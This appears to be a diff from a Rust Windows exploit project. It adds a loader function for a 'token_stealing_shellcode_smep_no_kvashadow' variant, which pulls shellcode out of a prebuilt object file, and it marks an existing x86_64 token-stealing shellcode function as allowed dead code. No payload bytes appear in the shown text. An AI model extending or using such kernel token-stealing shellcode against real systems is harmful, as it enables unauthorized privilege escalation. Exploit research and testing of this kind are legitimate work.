@@ -4,6 +4,7 @@ use goblin::pe::section_table::IMAGE_SCN_CNT_CODE;
 #[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 use goblin::Object;
 
+#[allow(dead_code)]
 #[cfg(all(target_arch = "x86_64"))]
 fn token_stealing_shellcode_fallback_x86_64() -> [u8; 84] {
     return concat_bytes!(
@@ -249,6 +250,15 @@ fn extract_shellcode_from_obj(shellcode_obj: &[u8]) -> Vec<u8> {
 #[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
 pub fn token_stealing_shellcode() -> Vec<u8> {
     let shellcode_obj = include_bytes!(concat!(env!("OUT_DIR"), "/token_stealing.obj"));
+    extract_shellcode_from_obj(shellcode_obj)
+}
+
+#[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
+pub fn token_stealing_shellcode_smep_no_kvashadow() -> Vec<u8> {
+    let shellcode_obj = include_bytes!(concat!(
+        env!("OUT_DIR"),
+        "/token_stealing_shellcode_smep_no_kvashadow.obj"
+    ));
     extract_shellcode_from_obj(shellcode_obj)
 }
 
